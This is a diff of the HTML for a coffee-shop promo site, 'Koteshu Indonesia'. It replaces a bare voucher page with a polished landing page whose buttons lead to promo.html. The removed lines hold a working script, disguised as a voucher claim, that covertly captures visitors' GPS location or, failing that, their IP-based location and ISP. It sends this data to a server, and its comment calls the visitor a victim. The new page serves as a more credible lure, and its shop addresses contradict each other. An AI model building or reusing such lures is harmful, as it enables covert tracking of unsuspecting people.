@@ -3,89 +3,478 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Koteshu Indonesia - Promo Spesial</title>
-    <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #fdfaf6; margin: 0; padding: 0; color: #3e2723; }
-        .hero { background: #6d4c41; color: white; text-align: center; padding: 40px 20px; }
-        .hero h1 { margin: 0; font-size: 28px; }
-        .container { max-width: 600px; margin: -20px auto 20px; padding: 20px; }
-        .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
-        .promo-img { width: 100%; height: 200px; background: #d7ccc8; border-radius: 8px; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #6d4c41;}
-        .btn { background: #e65100; color: white; border: none; padding: 15px 20px; font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer; width: 100%; transition: 0.3s; }
-        .btn:hover { background: #bf360c; }
-        #status { margin-top: 15px; font-size: 14px; color: #2e7d32; font-weight: bold; display: none; }
-    </style>
+    <title>Koteshu Indonesia — Kopi Lokal, Rasa Bintang Lima</title>
+    <meta name="description" content="Koteshu Indonesia: kopi single origin yang disangrai sendiri di Bandung. Nikmati espresso, aren latte, cold brew, dan pastry hangat setiap hari.">
+    <meta name="theme-color" content="#1d1310">
+
+    <link rel="icon" href="assets/favicon.svg" type="image/svg+xml">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,600;0,9..144,700;1,9..144,600&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="assets/css/style.css">
+    <noscript><style>.reveal { opacity: 1; transform: none; }</style></noscript>
 </head>
 <body>
 
-<div class="hero">
-    <h1>☕ Koteshu Indonesia</h1>
-    <p>Nikmati Kopi Lokal, Rasakan Sensasi Bintang Lima</p>
-</div>
+<a class="skip-link" href="#main">Lewati ke konten utama</a>
 
-<div class="container">
-    <div class="card">
-        <div class="promo-img">
-            <img src="/asset/promo.png" alt="">
-        </div>
-        <h2>Promo Spesial Hari Ini!</h2>
-        <p>Dapatkan potongan harga <b>50%</b> untuk pembelian kedua. Klik tombol di bawah untuk mengklaim voucher Anda!</p>
+<!-- ================= NAVBAR ================= -->
+<header class="nav" id="nav">
+    <div class="wrap nav-inner">
+        <a class="brand" href="index.html" aria-label="Koteshu Indonesia — beranda">
+            <span class="brand-mark" aria-hidden="true">K</span>
+            <span class="brand-text">Koteshu<small>INDONESIA</small></span>
+        </a>
 
-        <button class="btn" onclick="klaimPromo()">Klaim Voucher 50%</button>
-        <div id="status">✅ Voucher berhasil diklaim! Silakan cek WhatsApp Anda.</div>
+        <nav class="nav-links" id="navLinks" aria-label="Navigasi utama">
+            <a href="#tentang">Tentang</a>
+            <a href="#menu">Menu</a>
+            <a href="#suasana">Suasana</a>
+            <a href="#ulasan">Ulasan</a>
+            <a href="#lokasi">Lokasi</a>
+            <a class="btn btn-sm" href="promo.html">Klaim Promo 50%</a>
+        </nav>
+
+        <button class="nav-toggle" id="navToggle" aria-expanded="false" aria-controls="navLinks" aria-label="Buka menu navigasi">
+            <span></span><span></span><span></span>
+        </button>
     </div>
-</div>
+</header>
 
-<script>
-    // URL Endpoint PHP kita (relatif terhadap file HTML ini)
-    const SERVER_TARGET = 'simpan_data.php';
+<main id="main">
 
-    function klaimPromo() {
-        const statusDiv = document.getElementById('status');
+    <!-- ================= HERO ================= -->
+    <section class="hero">
+        <div class="wrap hero-grid">
+            <div class="hero-copy">
+                <p class="eyebrow">Kopi lokal, disangrai sendiri</p>
+                <h1>Setiap cangkir punya <em>cerita</em>.</h1>
+                <p class="lede">
+                    Biji pilihan dari petani Gayo, Toraja, dan Kintamani. Disangrai setiap minggu
+                    di roastery kami, lalu diseduh dengan resep yang kami uji ratusan kali.
+                </p>
 
-        // Fungsi untuk mengirim data ke backend
-        function kirimData(data) {
-            fetch(SERVER_TARGET, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).then(() => {
-                // Tampilkan pesan palsu ke korban
-                statusDiv.style.display = 'block';
-            }).catch(err => console.error("Gagal:", err));
-        }
+                <div class="hero-cta">
+                    <a class="btn" href="promo.html">
+                        Klaim Voucher 50%
+                        <svg class="icon" width="18" height="18" aria-hidden="true"><use href="#i-arrow"></use></svg>
+                    </a>
+                    <a class="btn btn-ghost" href="#menu">Lihat Menu</a>
+                </div>
 
-        // 1. Coba ambil GPS (Tingkat presisi tinggi)
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    kirimData({
-                        tipe: "GPS_AKURAT",
-                        latitude: pos.coords.latitude,
-                        longitude: pos.coords.longitude
-                    });
-                },
-                (error) => {
-                    // 2. JIKA DITOLAK, Ambil lokasi via IP Address sebagai fallback
-                    fetch('https://ipapi.co/json/')
-                        .then(res => res.json())
-                        .then(ipData => {
-                            kirimData({
-                                tipe: "IP_ADDRESS_LOKASI",
-                                ip: ipData.ip,
-                                kota: ipData.city,
-                                provider: ipData.org,
-                                latitude: ipData.latitude,
-                                longitude: ipData.longitude
-                            });
-                        });
-                }
-            );
-        } else {
-            statusDiv.style.display = 'block'; // Jika browser jadul
-        }
-    }
-</script>
+                <ul class="hero-stats">
+                    <li><strong>12</strong><span>Single origin</span></li>
+                    <li><strong>4,9/5</strong><span>1.200+ ulasan</span></li>
+                    <li><strong>7 th</strong><span>Meracik kopi</span></li>
+                </ul>
+            </div>
 
+            <div class="hero-art" aria-hidden="false">
+                <div class="steam" aria-hidden="true"><i></i><i></i><i></i></div>
+
+                <svg class="cup" viewBox="0 0 440 400" role="img" aria-label="Ilustrasi secangkir kopi panas Koteshu">
+                    <defs>
+                        <linearGradient id="cupBody" x1="0" y1="0" x2="0" y2="1">
+                            <stop offset="0" stop-color="#fffdf8"/>
+                            <stop offset="1" stop-color="#e9d8c2"/>
+                        </linearGradient>
+                        <linearGradient id="coffeeGrad" x1="0" y1="0" x2="1" y2="1">
+                            <stop offset="0" stop-color="#8a5427"/>
+                            <stop offset="1" stop-color="#42220f"/>
+                        </linearGradient>
+                    </defs>
+
+                    <ellipse cx="220" cy="352" rx="152" ry="22" fill="#1d1310" opacity=".13"/>
+                    <ellipse cx="220" cy="338" rx="142" ry="24" fill="#f7ecdc"/>
+                    <ellipse cx="220" cy="333" rx="108" ry="16" fill="#e6d6c0"/>
+
+                    <path d="M322 158c58 0 58 92 0 92" fill="none" stroke="#f2e4d0" stroke-width="20" stroke-linecap="round"/>
+                    <path d="M96 132h220l-22 150c-4 28-27 46-55 46h-66c-28 0-51-18-55-46z" fill="url(#cupBody)"/>
+                    <ellipse cx="206" cy="136" rx="110" ry="22" fill="#c9a06f"/>
+                    <ellipse cx="206" cy="134" rx="104" ry="19" fill="url(#coffeeGrad)"/>
+                    <path d="M206 128c8-10 22-6 22 4 0 9-13 17-22 24-9-7-22-15-22-24 0-10 14-14 22-4z" fill="#e7c9a2" opacity=".55"/>
+                    <ellipse cx="206" cy="134" rx="110" ry="22" fill="none" stroke="#fff" stroke-opacity=".55" stroke-width="2.5"/>
+                    <path d="M120 158c4 34 10 74 16 104" fill="none" stroke="#fff" stroke-opacity=".7" stroke-width="5" stroke-linecap="round"/>
+                </svg>
+
+                <div class="art-badge art-badge--top">
+                    <span class="dot" aria-hidden="true"></span> Roasted in-house
+                </div>
+                <div class="art-badge art-badge--bottom">
+                    <strong>4,9</strong>
+                    <span>dari 1.200+ ulasan</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ================= MARQUEE ================= -->
+    <div class="marquee" aria-hidden="true">
+        <div class="marquee-track">
+            <span>Single origin</span><span>Disangrai mingguan</span><span>Manual brew</span>
+            <span>Pastry harian</span><span>Biji lokal</span><span>Sejak 2019</span>
+            <span>Single origin</span><span>Disangrai mingguan</span><span>Manual brew</span>
+            <span>Pastry harian</span><span>Biji lokal</span><span>Sejak 2019</span>
+        </div>
+    </div>
+
+    <!-- ================= TENTANG ================= -->
+    <section class="section" id="tentang">
+        <div class="wrap about-grid">
+            <div class="about-copy reveal">
+                <p class="eyebrow">Tentang kami</p>
+                <h2>Dari kebun kecil di Gayo, sampai cangkir di meja Anda.</h2>
+                <p>
+                    Koteshu lahir dari satu pertanyaan sederhana: kenapa kopi Indonesia yang begitu
+                    baik jarang dinikmati di kampungnya sendiri? Kami membeli biji langsung dari
+                    petani, menyangrai dalam batch kecil, dan menyeduhnya tanpa banyak drama.
+                </p>
+
+                <ul class="checklist">
+                    <li>
+                        <svg class="icon" width="18" height="18" aria-hidden="true"><use href="#i-check"></use></svg>
+                        Harga beli biji yang adil dan transparan untuk petani mitra.
+                    </li>
+                    <li>
+                        <svg class="icon" width="18" height="18" aria-hidden="true"><use href="#i-check"></use></svg>
+                        Disangrai maksimal 14 hari sebelum diseduh.
+                    </li>
+                    <li>
+                        <svg class="icon" width="18" height="18" aria-hidden="true"><use href="#i-check"></use></svg>
+                        Barista kami dilatih minimum 6 bulan sebelum berdiri di bar.
+                    </li>
+                </ul>
+            </div>
+
+            <div class="about-cards reveal">
+                <div class="about-card">
+                    <strong>12</strong>
+                    <span>Single origin aktif</span>
+                </div>
+                <div class="about-card">
+                    <strong>350+</strong>
+                    <span>Cangkir per hari</span>
+                </div>
+                <div class="about-card">
+                    <strong>24</strong>
+                    <span>Petani mitra</span>
+                </div>
+                <div class="about-card">
+                    <strong>100%</strong>
+                    <span>Biji Indonesia</span>
+                </div>
+                <div class="about-card about-card--wide">
+                    <h3>“Kopi terbaik tidak perlu berteriak.”</h3>
+                    <p>— Rani Kusuma, founder Koteshu Indonesia</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ================= MENU ================= -->
+    <section class="section menu-section" id="menu">
+        <div class="wrap">
+            <div class="menu-head">
+                <div class="section-head">
+                    <p class="eyebrow">Menu andalan</p>
+                    <h2>Dipilih pelanggan, diuji barista.</h2>
+                    <p>Semua kopi bisa dinikmati panas atau dingin. Harga sudah termasuk pajak.</p>
+                </div>
+
+                <div class="chips" role="group" aria-label="Filter kategori menu">
+                    <button class="chip" data-filter="semua" aria-pressed="true">Semua</button>
+                    <button class="chip" data-filter="kopi" aria-pressed="false">Kopi</button>
+                    <button class="chip" data-filter="non-kopi" aria-pressed="false">Non-kopi</button>
+                    <button class="chip" data-filter="makanan" aria-pressed="false">Makanan</button>
+                </div>
+            </div>
+
+            <div class="menu-grid" id="menuGrid">
+                <article class="menu-card reveal" data-kategori="kopi">
+                    <span class="tag">Best seller</span>
+                    <span class="menu-icon"><svg class="icon" width="22" height="22" aria-hidden="true"><use href="#i-cup"></use></svg></span>
+                    <h3>Espresso Koteshu</h3>
+                    <p>Dua shot, crema tebal, aftertaste cokelat hitam.</p>
+                    <div class="menu-price"><span>Rp 18.000</span><span class="menu-meta">Panas / Dingin</span></div>
+                </article>
+
+                <article class="menu-card reveal" data-kategori="kopi">
+                    <span class="tag">Best seller</span>
+                    <span class="menu-icon"><svg class="icon" width="22" height="22" aria-hidden="true"><use href="#i-cup"></use></svg></span>
+                    <h3>Aren Latte</h3>
+                    <p>Espresso, susu segar, dan gula aren cair dari Sukabumi.</p>
+                    <div class="menu-price"><span>Rp 28.000</span><span class="menu-meta">Panas / Dingin</span></div>
+                </article>
+
+                <article class="menu-card reveal" data-kategori="kopi">
+                    <span class="tag tag--green">Baru</span>
+                    <span class="menu-icon"><svg class="icon" width="22" height="22" aria-hidden="true"><use href="#i-filter"></use></svg></span>
+                    <h3>V60 Gayo</h3>
+                    <p>Seduhan manual, catatan rasa jeruk dan bunga.</p>
+                    <div class="menu-price"><span>Rp 32.000</span><span class="menu-meta">Manual brew</span></div>
+                </article>
+
+                <article class="menu-card reveal" data-kategori="kopi">
+                    <span class="menu-icon"><svg class="icon" width="22" height="22" aria-hidden="true"><use href="#i-glass"></use></svg></span>
+                    <h3>Cold Brew 12 Jam</h3>
+                    <p>Diekstrak dingin semalaman, rendah asam, menyegarkan.</p>
+                    <div class="menu-price"><span>Rp 30.000</span><span class="menu-meta">Dingin</span></div>
+                </article>
+
+                <article class="menu-card reveal" data-kategori="non-kopi">
+                    <span class="menu-icon"><svg class="icon" width="22" height="22" aria-hidden="true"><use href="#i-leaf"></use></svg></span>
+                    <h3>Matcha Koteshu</h3>
+                    <p>Matcha kelas ceremonial, dikocok langsung saat dipesan.</p>
+                    <div class="menu-price"><span>Rp 30.000</span><span class="menu-meta">Panas / Dingin</span></div>
+                </article>
+
+                <article class="menu-card reveal" data-kategori="non-kopi">
+                    <span class="menu-icon"><svg class="icon" width="22" height="22" aria-hidden="true"><use href="#i-cup"></use></svg></span>
+                    <h3>Cokelat Klasik</h3>
+                    <p>Bubuk kakao 70%, susu full cream, sedikit garam laut.</p>
+                    <div class="menu-price"><span>Rp 27.000</span><span class="menu-meta">Panas / Dingin</span></div>
+                </article>
+
+                <article class="menu-card reveal" data-kategori="makanan">
+                    <span class="menu-icon"><svg class="icon" width="22" height="22" aria-hidden="true"><use href="#i-bread"></use></svg></span>
+                    <h3>Croissant Butter</h3>
+                    <p>72 lapisan, dipanggang ulang setiap dua jam.</p>
+                    <div class="menu-price"><span>Rp 25.000</span><span class="menu-meta">Dipanggang segar</span></div>
+                </article>
+
+                <article class="menu-card reveal" data-kategori="makanan">
+                    <span class="tag">Favorit</span>
+                    <span class="menu-icon"><svg class="icon" width="22" height="22" aria-hidden="true"><use href="#i-bread"></use></svg></span>
+                    <h3>Pisang Karamel</h3>
+                    <p>Pisang raja, saus karamel asin, taburan almond.</p>
+                    <div class="menu-price"><span>Rp 22.000</span><span class="menu-meta">Selalu hangat</span></div>
+                </article>
+            </div>
+        </div>
+    </section>
+
+    <!-- ================= SUASANA ================= -->
+    <section class="section" id="suasana">
+        <div class="wrap">
+            <div class="section-head reveal">
+                <p class="eyebrow">Suasana kedai</p>
+                <h2>Tempat untuk berlama-lama.</h2>
+                <p>Wifi cepat, colokan di setiap meja, dan kursi yang sengaja dibuat tidak nyaman untuk pergi.</p>
+            </div>
+
+            <div class="gallery-grid reveal">
+                <div class="gallery-item gallery-item--tall g1">
+                    <span><small>Roastery</small>Bar roasting<br>di lantai dua</span>
+                </div>
+                <div class="gallery-item g2">
+                    <span><small>Bar</small>Kursi bar kayu jati</span>
+                </div>
+                <div class="gallery-item g3">
+                    <span><small>Sudut baca</small>Rak buku 400 judul</span>
+                </div>
+                <div class="gallery-item gallery-item--tall g4">
+                    <span><small>Teras</small>Meja outdoor<br>untuk 20 orang</span>
+                </div>
+                <div class="gallery-item gallery-item--wide g5">
+                    <span><small>Latte art</small>Workshop setiap Sabtu pagi</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ================= ULASAN ================= -->
+    <section class="section reviews" id="ulasan">
+        <div class="wrap">
+            <div class="section-head reveal">
+                <p class="eyebrow">Kata mereka</p>
+                <h2>Ulasan yang tidak kami bayar.</h2>
+                <p>Diambil dari Google Maps dan Instagram, apa adanya.</p>
+            </div>
+
+            <div class="review-grid">
+                <article class="review-card reveal">
+                    <div class="stars" aria-label="5 dari 5 bintang">
+                        <svg class="icon" width="16" height="16" aria-hidden="true"><use href="#i-star"></use></svg>
+                        <svg class="icon" width="16" height="16" aria-hidden="true"><use href="#i-star"></use></svg>
+                        <svg class="icon" width="16" height="16" aria-hidden="true"><use href="#i-star"></use></svg>
+                        <svg class="icon" width="16" height="16" aria-hidden="true"><use href="#i-star"></use></svg>
+                        <svg class="icon" width="16" height="16" aria-hidden="true"><use href="#i-star"></use></svg>
+                    </div>
+                    <blockquote>“Aren latte-nya beda dari tempat lain. Manisnya pas, kopinya masih terasa. Sudah langganan tiap pagi sebelum masuk kantor.”</blockquote>
+                    <div class="reviewer">
+                        <span class="avatar" aria-hidden="true">DA</span>
+                        <div><strong>Dimas A.</strong><span>Pelanggan sejak 2020</span></div>
+                    </div>
+                </article>
+
+                <article class="review-card reveal">
+                    <div class="stars" aria-label="5 dari 5 bintang">
+                        <svg class="icon" width="16" height="16" aria-hidden="true"><use href="#i-star"></use></svg>
+                        <svg class="icon" width="16" height="16" aria-hidden="true"><use href="#i-star"></use></svg>
+                        <svg class="icon" width="16" height="16" aria-hidden="true"><use href="#i-star"></use></svg>
+                        <svg class="icon" width="16" height="16" aria-hidden="true"><use href="#i-star"></use></svg>
+                        <svg class="icon" width="16" height="16" aria-hidden="true"><use href="#i-star"></use></svg>
+                    </div>
+                    <blockquote>“Saya kerja remote di sini hampir tiap hari. Wifi kencang, baristanya hafal pesanan, dan croissant-nya selalu hangat.”</blockquote>
+                    <div class="reviewer">
+                        <span class="avatar" aria-hidden="true">NP</span>
+                        <div><strong>Nadia P.</strong><span>Freelance designer</span></div>
+                    </div>
+                </article>
+
+                <article class="review-card reveal">
+                    <div class="stars" aria-label="5 dari 5 bintang">
+                        <svg class="icon" width="16" height="16" aria-hidden="true"><use href="#i-star"></use></svg>
+                        <svg class="icon" width="16" height="16" aria-hidden="true"><use href="#i-star"></use></svg>
+                        <svg class="icon" width="16" height="16" aria-hidden="true"><use href="#i-star"></use></svg>
+                        <svg class="icon" width="16" height="16" aria-hidden="true"><use href="#i-star"></use></svg>
+                        <svg class="icon" width="16" height="16" aria-hidden="true"><use href="#i-star"></use></svg>
+                    </div>
+                    <blockquote>“Ikut workshop manual brew Sabtu lalu. Baristanya sabar menjelaskan, dan pulang bawa resep V60 sendiri.”</blockquote>
+                    <div class="reviewer">
+                        <span class="avatar" aria-hidden="true">RS</span>
+                        <div><strong>Rangga S.</strong><span>Peserta workshop</span></div>
+                    </div>
+                </article>
+            </div>
+        </div>
+    </section>
+
+    <!-- ================= LOKASI ================= -->
+    <section class="section" id="lokasi">
+        <div class="wrap location-grid">
+            <div class="info-card reveal">
+                <p class="eyebrow">Mampir</p>
+                <h2>Kami buka setiap hari.</h2>
+
+                <div class="info-block">
+                    <h3>Alamat</h3>
+                    <p>Jl. A. Yani No.68 Tanah Sareal, Kota Bogor<br>Sebelah taman heulang, parkir di halaman belakang.</p>
+                </div>
+
+                <div class="info-block">
+                    <h3>Jam buka</h3>
+                    <ul class="hours" id="hoursList">
+                        <li data-day="1"><span>Senin – Kamis</span><span>08.00 – 22.00</span></li>
+                        <li data-day="5"><span>Jumat – Sabtu</span><span>08.00 – 24.00</span></li>
+                        <li data-day="0"><span>Minggu</span><span>09.00 – 22.00</span></li>
+                    </ul>
+                </div>
+
+                <div class="info-block">
+                    <h3>Kontak</h3>
+                    <p><a href="https://wa.me/6281234567890" target="_blank" rel="noopener">WhatsApp: 0812-3456-7890</a><br>
+                    <a href="mailto:halo@koteshuindonesia.my.id">halo@koteshuindonesia.my.id</a></p>
+                </div>
+
+                <div class="hero-cta" style="margin: 22px 0 0;">
+                    <a class="btn" href="promo.html">Klaim Promo 50%</a>
+                    <a class="btn btn-ghost" href="https://wa.me/6281234567890" target="_blank" rel="noopener">Reservasi meja</a>
+                </div>
+            </div>
+
+            <div class="map-card reveal">
+                <div class="map-pin">
+                    <svg class="icon" width="30" height="30" aria-hidden="true"><use href="#i-pin"></use></svg>
+                    <strong>Koteshu Indonesia</strong>
+                    <span>Jl. Cendana Raya No. 24<br>Bandung, Jawa Barat</span>
+                    <a class="btn btn-sm" href="https://www.google.com/maps/search/?api=1&amp;query=Koteshu+Indonesia+Bandung" target="_blank" rel="noopener">
+                        Buka di Google Maps
+                        <svg class="icon" width="16" height="16" aria-hidden="true"><use href="#i-arrow"></use></svg>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ================= PROMO BAND ================= -->
+    <section class="section section--tight" aria-labelledby="promoBandTitle">
+        <div class="wrap">
+            <div class="promo-band reveal">
+                <div>
+                    <p class="eyebrow" style="color: var(--amber);">Promo bulan ini</p>
+                    <h2 id="promoBandTitle">Secangkir kedua, setengah harga.</h2>
+                    <p>Khusus pengunjung yang mengklaim voucher melalui halaman promo. Kuota 100 voucher per hari.</p>
+                    <div class="hero-cta" style="margin: 24px 0 0;">
+                        <a class="btn" href="promo.html">Ambil voucher sekarang</a>
+                        <a class="btn btn-ghost" style="color: var(--cream); border-color: rgba(251,246,238,.35);" href="#menu">Cek menu dulu</a>
+                    </div>
+                </div>
+
+                <div class="promo-ticket">
+                    <small>Voucher digital</small>
+                    <div class="big">50% OFF</div>
+                    <span>pembelian kedua</span>
+                    <div class="code">KOTESHU50</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+</main>
+
+<!-- ================= FOOTER ================= -->
+<footer class="footer">
+    <div class="wrap">
+        <div class="footer-grid">
+            <div>
+                <a class="brand" href="index.html" aria-label="Koteshu Indonesia">
+                    <span class="brand-mark" aria-hidden="true">K</span>
+                    <span class="brand-text">Koteshu<small>INDONESIA</small></span>
+                </a>
+                <p>Kopi single origin Indonesia, disangrai dan diseduh di Bandung sejak 2019.</p>
+            </div>
+
+            <div>
+                <h3>Jelajahi</h3>
+                <ul>
+                    <li><a href="#tentang">Tentang kami</a></li>
+                    <li><a href="#menu">Menu</a></li>
+                    <li><a href="#suasana">Suasana</a></li>
+                    <li><a href="promo.html">Promo 50%</a></li>
+                </ul>
+            </div>
+
+            <div>
+                <h3>Kunjungi</h3>
+                <ul>
+                    <li>Jl. Cendana Raya No. 24</li>
+                    <li>Bandung, Jawa Barat</li>
+                    <li>Senin–Minggu</li>
+                    <li>08.00 – 22.00</li>
+                </ul>
+            </div>
+
+            <div>
+                <h3>Terhubung</h3>
+                <ul>
+                    <li><a href="https://wa.me/6281234567890" target="_blank" rel="noopener">WhatsApp</a></li>
+                    <li><a href="https://instagram.com" target="_blank" rel="noopener">Instagram</a></li>
+                    <li><a href="mailto:halo@koteshuindonesia.my.id">Email</a></li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="footer-bottom">
+            <span>© <span id="year">2026</span> Koteshu Indonesia. Dibuat untuk latihan.</span>
+            <span>Bandung, Indonesia</span>
+        </div>
+    </div>
+</footer>
+
+<!-- ================= IKON SVG ================= -->
+<svg width="0" height="0" style="position:absolute" aria-hidden="true" focusable="false">
+    <symbol id="i-arrow" viewBox="0 0 24 24"><path d="M5 12h14M13 6l6 6-6 6"/></symbol>
+    <symbol id="i-check" viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></symbol>
+    <symbol id="i-star" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 2.5l2.9 6.1 6.6.9-4.8 4.6 1.2 6.6L12 17.6 6.1 20.7l1.2-6.6L2.5 9.5l6.6-.9z"/></symbol>
+    <symbol id="i-cup" viewBox="0 0 24 24"><path d="M4 8h12v6a5 5 0 01-5 5H9a5 5 0 01-5-5z"/><path d="M16 9h2a3 3 0 010 6h-2"/><path d="M6 3v2M10 3v2M14 3v2"/></symbol>
+    <symbol id="i-glass" viewBox="0 0 24 24"><path d="M6 4h12l-1.2 14a2 2 0 01-2 1.9H9.2a2 2 0 01-2-1.9z"/><path d="M6.6 11h10.8"/></symbol>
+    <symbol id="i-filter" viewBox="0 0 24 24"><path d="M6 3h12l-4 7v9l-4 2v-11z"/></symbol>
+    <symbol id="i-leaf" viewBox="0 0 24 24"><path d="M4 20c8 0 16-4 16-16C10 4 4 8 4 20z"/><path d="M4 20c2-6 6-9 11-11"/></symbol>
+    <symbol id="i-bread" viewBox="0 0 24 24"><path d="M3 12a5 5 0 015-5h8a5 5 0 010 10H8a5 5 0 01-5-5z"/><path d="M9 9l-1.5 6M14 9l-1.5 6"/></symbol>
+    <symbol id="i-pin" viewBox="0 0 24 24"><path d="M12 21s7-6.2 7-11a7 7 0 10-14 0c0 4.8 7 11 7 11z"/><circle cx="12" cy="10" r="2.6"/></symbol>
+</svg>
+
+<script src="assets/js/main.js" defer></script>
 </body>
 </html>
